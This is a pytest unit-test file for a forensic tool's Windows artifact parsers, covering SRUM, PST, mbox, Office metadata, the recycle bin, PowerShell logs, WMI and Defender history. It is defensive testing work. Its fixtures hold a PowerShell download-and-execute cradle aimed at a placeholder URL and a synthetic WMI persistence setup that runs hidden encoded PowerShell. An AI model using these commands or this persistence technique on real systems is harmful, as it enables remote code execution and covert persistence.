"""Unit tests: Windows artifact parsers (SRUM, PST, mbox, Office, recycle bin, PowerShell,
Timeline, WMI, setupapi, firewall, Defender)."""
from __future__ import annotations

import struct
from collections import Counter

import pytest

from veritas.parsers import (
    email_pst, mbox, office, powershell, recyclebin, setupapi, srum, windefender, windows_firewall,
    windows_timeline, wmi,
)
from veritas.parsers.base import ParserError, Provenance


def run(cls, path, **prov):
    p = cls()
    events = list(p.parse(str(path), Provenance(evidence_path=str(path), **prov)))
    return events, p


def kinds(events):
    return Counter((e.data_type, e.timestamp_desc) for e in events)


def test_srum(corpus):
    ev, p = run(srum.SrumParser, corpus / "plaso/SRUDB.dat")
    assert p.warning_count == 0
    k = kinds(ev)
    assert len(ev) == 24247
    assert k[("windows:srum:application_usage", "Recorded Time")] == 16183
    assert k[("windows:srum:network_usage", "Recorded Time")] == 1840
    assert k[("windows:srum:network_connectivity", "Recorded Time")] == 260
    assert k[("windows:srum:network_connectivity", "Last Connection Time")] == 260
    assert k[("windows:srum:app_timeline", "Recorded Time")] == 2851
    usage = next(e for e in ev if e.data_type == "windows:srum:network_usage")
    assert isinstance(usage.attrs["bytes_sent"], int)
    # Id map resolution: SIDs for users, strings for applications.
    assert any((e.attrs.get("user_identifier") or "").startswith("S-1-5-") for e in ev[:200])
    assert all(e.timestamp % 1000 == 0 for e in ev if e.timestamp_desc == "Recorded Time")


def test_pst(corpus):
    ev, p = run(email_pst.PstParser, corpus / "plaso/nromanoff@stark-research-labs.com.pst")
    assert p.warning_count == 0
    k = kinds(ev)
    assert k[("pst:message", "Received Time")] == 540
    assert k[("pst:message", "Sent Time")] == 538
    assert k[("pst:message", "Creation Time")] == 543
    first = ev[0]
    assert first.attrs["subject"] == "When is the meeting?"
    assert first.attrs["sender_name"] == "Nick Fury"
    assert first.attrs["folder"] == "/Top of Outlook data file/Inbox"
    assert "nromanoff@stark-research-labs.com" in first.attrs["to"]
    assert first.timestamp == 1289387317000000000
    assert first.attrs["body"].startswith("Today?")
    assert len(first.attrs["body"]) <= 4096
    folders = {e.attrs["folder"] for e in ev}
    assert "/Top of Outlook data file/Sent Items" in folders


def test_pst_rejects_non_pst(tmp_path):
    f = tmp_path / "x.pst"
    f.write_bytes(b"!BDN" + b"\x00" * 100)
    with pytest.raises(ParserError):
        list(email_pst.PstParser().parse(str(f), Provenance()))


MBOX = (b"From alice@example.com Mon Jan 15 10:00:00 2024\n"
        b"From: Alice <alice@example.com>\nTo: bob@example.com\nSubject: hello\n"
        b"Date: Mon, 15 Jan 2024 09:59:58 +0100\nMessage-ID: <1@example.com>\n\nbody one\n>From quoted\n\n"
        b"From bob@example.com Tue Jan 16 11:00:00 2024\n"
        b"From: Bob <bob@example.com>\nTo: alice@example.com\nSubject: re: hello\n"
        b"MIME-Version: 1.0\nContent-Type: multipart/mixed; boundary=XX\n\n--XX\nContent-Type: text/plain\n\nsecond\n"
        b"--XX\nContent-Type: application/octet-stream\nContent-Disposition: attachment; filename=\"evil.exe\"\n\nAAAA\n--XX--\n")


def test_mbox(tmp_path):
    f = tmp_path / "inbox.mbox"
    f.write_bytes(MBOX)
    assert mbox.MboxParser().matches(str(f), MBOX[:4096])
    ev, p = run(mbox.MboxParser, f)
    k = kinds(ev)
    assert k[("mbox:message", "Sent Time")] == 1 and k[("mbox:message", "Received Time")] == 2
    sent = next(e for e in ev if e.timestamp_desc == "Sent Time")
    assert sent.timestamp == 1705309198 * 10**9  # 09:59:58 +0100 == 08:59:58Z
    assert sent.attrs["subject"] == "hello" and sent.attrs["message_id"] == "<1@example.com>"
    second = [e for e in ev if e.attrs["message_index"] == 1][0]
    assert second.attrs["attachment_names"] == ["evil.exe"]
    assert second.attrs["body"].strip() == "second"


def test_ooxml(corpus):
    ev, _ = run(office.OoxmlParser, corpus / "plaso/Document.docx")
    by = {e.timestamp_desc: e for e in ev}
    assert by["Creation Time"].timestamp == 1352330940000000000
    assert by["Content Modification Time"].timestamp == 1377469080000000000
    a = by["Creation Time"].attrs
    assert a["creator"] == "Nides" and a["last_modified_by"] == "Nides" and a["revision"] == 3
    assert a["application"] == "Microsoft Office Word" and a["template"] == "Normal.dotm"


def test_ooxml_rejects_doctype(tmp_path):
    import zipfile

    f = tmp_path / "bomb.docx"
    with zipfile.ZipFile(f, "w") as z:
        z.writestr("docProps/core.xml", '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY a "aaaa">]><x>&a;</x>')
    ev, p = run(office.OoxmlParser, f)
    assert p.warning_count == 1 and ev[0].timestamp is None


def test_olecf_summary(corpus):
    ev, _ = run(office.OlecfSummaryParser, corpus / "plaso/Document.doc")
    by = {(e.data_type, e.timestamp_desc): e for e in ev}
    s = by[("olecf:summary_info", "Document Creation Time")]
    assert s.timestamp == 1355164680000000000
    assert by[("olecf:summary_info", "Document Last Save Time")].timestamp == 1368671340000000000
    assert s.attrs["title"] == "Table of Context" and s.attrs["author"] == "DAVID NIDES"
    assert s.attrs["last_saved_by"] == "Nides"
    assert by[("olecf:document_summary_info", "Not a time")].attrs["company"] == "KPMG"


def test_recycle_bin_i_files(corpus):
    ev, _ = run(recyclebin.RecycleBinIParser, corpus / "plaso/recycler/$I103S5F.jpg")
    assert len(ev) == 1
    assert ev[0].attrs["original_filename"] == "C:\\Users\\random\\Downloads\\bunnies.jpg"
    assert ev[0].attrs["format_version"] == 2 and ev[0].attrs["file_size"] == 222255
    assert ev[0].timestamp == 1467236265618000000
    ev, _ = run(recyclebin.RecycleBinIParser, corpus / "plaso/recycler/$II3DF3L.zip")
    assert ev[0].attrs["format_version"] == 1
    assert ev[0].attrs["original_filename"].endswith("StarFury.zip")
    assert ev[0].timestamp == 1331585398633000000


def test_recycler_info2(corpus):
    ev, _ = run(recyclebin.RecyclerInfo2Parser, corpus / "plaso/recycler/INFO2")
    assert len(ev) == 4
    assert ev[0].attrs["original_filename"] == "C:\\Documents and Settings\\Mr. Evil\\Desktop\\lalsetup250.exe"
    assert ev[0].attrs["record_index"] == 1 and ev[0].attrs["drive_number"] == 2
    assert ev[0].timestamp == 1093450705237000000
    assert ev[-1].attrs["original_filename"].endswith("ethereal-setup-0.10.6.exe")


def test_powershell_transcript(corpus):
    ev, _ = run(powershell.PowerShellTranscriptParser, corpus / "plaso/powershell_transcript.txt")
    assert len(ev) == 1
    e = ev[0]
    assert e.attrs["command"] == "whoami" and e.attrs["working_directory"] == "C:\\Windows\\system32"
    assert e.attrs["username"] == "MSEDGEWIN10\\IEUser" and e.host == "MSEDGEWIN10"
    assert e.timestamp == 1658371069000000000  # Start time: 20220721023749
    assert e.attrs["output"].strip() == "msedgewin10\\ieuser"


def test_powershell_consolehost_history(tmp_path):
    f = tmp_path / "ConsoleHost_history.txt"
    f.write_text("whoami\nGet-Process `\n  | Select -First 1\n\nIEX (New-Object Net.WebClient).DownloadString('http://x')\n",
                 encoding="utf-8")
    ev, _ = run(powershell.PowerShellHistoryParser, f)
    assert [e.attrs["line_index"] for e in ev] == [1, 2, 5]
    assert all(e.timestamp is None and e.timestamp_desc == "Not a time" for e in ev)
    assert ev[1].attrs["command"] == "Get-Process `\n  | Select -First 1"


def test_windows_timeline(corpus):
    ev, _ = run(windows_timeline.WindowsTimelineParser, corpus / "plaso/windows/ActivitiesCache.db")
    k = kinds(ev)
    assert len(ev) == 415
    assert k[("windows:timeline:generic", "Start Time")] == 33
    assert k[("windows:timeline:user_engaged", "Start Time")] == 79
    g = next(e for e in ev if e.data_type == "windows:timeline:generic")
    assert g.attrs["display_text"] == "Settings"
    assert g.attrs["application"].startswith("windows.immersivecontrolpanel")
    ue = next(e for e in ev if e.data_type == "windows:timeline:user_engaged")
    assert ue.attrs["reporting_app"] == "ShellActivityMonitor" and isinstance(ue.attrs["active_duration_seconds"], int)


def test_setupapi(corpus):
    ev, _ = run(setupapi.SetupApiParser, corpus / "plaso/setupapi.dev.log")
    k = kinds(ev)
    assert k[("windows:setupapi:log:line", "Added Time")] == 194
    assert k[("windows:setupapi:log:line", "End Time")] == 194
    assert ev[0].timestamp == 1448215168110000000
    assert ev[0].attrs["device_instance_id"].startswith("SWD\\IP_TUNNEL_VBUS")
    usb = [e for e in ev if "USBSTOR" in (e.attrs["entry_type"] or "")]
    assert usb and usb[-1].attrs["exit_status"] == "SUCCESS"


def test_windows_firewall(corpus):
    ev, _ = run(windows_firewall.WindowsFirewallParser, corpus / "plaso/windows_firewall.log")
    assert len(ev) == 15
    assert ev[0].attrs["action"] == "DROP" and ev[0].attrs["protocol"] == "UDP"
    assert ev[0].attrs["src_ip"] == "123.45.78.90" and ev[0].attrs["dst_port"] == 137
    assert ev[0].timestamp == 1113206757000000000 and ev[0].attrs["time_is_local"] is True


def test_defender_detection_history(corpus):
    d = corpus / "plaso/windefender_history"
    out = {}
    for f in sorted(d.iterdir()):
        ev, _ = run(windefender.DefenderDetectionHistoryParser, f)
        assert len(ev) == 1
        out[f.name] = ev[0]
    e = out["6AFE33A0-19BA-4FFF-892F-B700539D7D63"]
    assert e.attrs["threat_name"] == "Virus:DOS/EICAR_Test_File"
    assert e.attrs["filename"] == "C:\\Users\\testuser\\Downloads\\eicar_com.zip->eicar.com"
    assert e.timestamp == 1658468178909442100
    assert out["FC380697-A68D-4C94-B67F-9B6449039463"].attrs["process"] == "C:\\Windows\\explorer.exe"


# ---------------------------------------------------------------- WMI (synthetic fixture)
def _wmi_fixture() -> bytes:
    """Build bytes resembling OBJECTS.DATA instance records (no real repository in the corpus)."""
    def u16(s: str) -> bytes:
        return s.encode("utf-16-le") + b"\x00\x00"

    junk = bytes(range(256)) * 4
    filt = (b"\x00" * 16 + u16("__EventFilter") + b"\x01\x02" + u16("BadStartup") + b"\x00\x07"
            + u16("SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA "
                  "'Win32_PerfFormattedData_PerfOS_System'") + u16("WQL") + u16("root\\cimv2"))
    cons = (b"\x00" * 16 + b"CommandLineEventConsumer\x00\x00\x00\x03" + b"BadConsumer\x00"
            + b"\x00\x00" + b"powershell.exe -nop -w hidden -enc SQBFAFgA\x00" + b"\x00" * 8)
    script = (b"\x00" * 16 + u16("ActiveScriptEventConsumer") + u16("ScriptKiddie") + u16("VBScript")
              + u16('Set objShell = CreateObject("WScript.Shell"): objShell.Run "calc.exe"'))
    bind = (b"\x00" * 16 + b"__FilterToConsumerBinding\x00" + b'CommandLineEventConsumer.Name="BadConsumer"\x00'
            + b'__EventFilter.Name="BadStartup"\x00')
    definition = b"\x00" * 16 + b"__EventFilter\x00Name\x00Query\x00QueryLanguage\x00"
    return junk + definition + junk + filt + junk + cons + junk + script + junk + bind + junk


def test_wmi_persistence_synthetic(tmp_path):
    f = tmp_path / "OBJECTS.DATA"
    f.write_bytes(_wmi_fixture())
    ev, p = run(wmi.WmiPersistenceParser, f)
    by = Counter(e.data_type for e in ev)
    assert by == Counter({"wmi:persistence:filter": 1, "wmi:persistence:consumer": 2, "wmi:persistence:binding": 1})
    flt = next(e for e in ev if e.data_type == "wmi:persistence:filter")
    assert flt.attrs["name"] == "BadStartup"
    assert flt.attrs["query"].startswith("SELECT * FROM __InstanceModificationEvent")
    cmd = next(e for e in ev if e.attrs.get("class") == "CommandLineEventConsumer")
    assert cmd.attrs["command_line_template"] == "powershell.exe -nop -w hidden -enc SQBFAFgA"
    assert cmd.attrs["name"] == "BadConsumer"
    scr = next(e for e in ev if e.attrs.get("class") == "ActiveScriptEventConsumer")
    assert scr.attrs["scripting_engine"] == "VBScript" and "calc.exe" in scr.attrs["script_text"]
    b = next(e for e in ev if e.data_type == "wmi:persistence:binding")
    assert (b.attrs["filter_name"], b.attrs["consumer_class"], b.attrs["consumer_name"]) == (
        "BadStartup", "CommandLineEventConsumer", "BadConsumer")
    assert all(e.timestamp is None and e.timestamp_desc == "Not a time" for e in ev)


def test_wmi_empty_file_raises(tmp_path):
    f = tmp_path / "OBJECTS.DATA"
    f.write_bytes(b"")
    with pytest.raises(ParserError):
        list(wmi.WmiPersistenceParser().parse(str(f), Provenance()))


def test_defender_rejects_truncated(corpus, tmp_path):
    src = (corpus / "plaso/windefender_history/6AFE33A0-19BA-4FFF-892F-B700539D7D63").read_bytes()
    for cut in (77, 333, 1001):  # mid-value cuts (trimming only alignment padding stays parseable)
        f = tmp_path / f"trunc{cut}"
        f.write_bytes(src[:cut])
        with pytest.raises(ParserError):
            list(windefender.DefenderDetectionHistoryParser().parse(str(f), Provenance()))


def test_recycle_bin_bad_version(tmp_path):
    f = tmp_path / "$IABCDEF.txt"
    f.write_bytes(struct.pack("<QQQ", 7, 1, 1) + b"\x00" * 10)
    with pytest.raises(ParserError):
        list(recyclebin.RecycleBinIParser().parse(str(f), Provenance()))
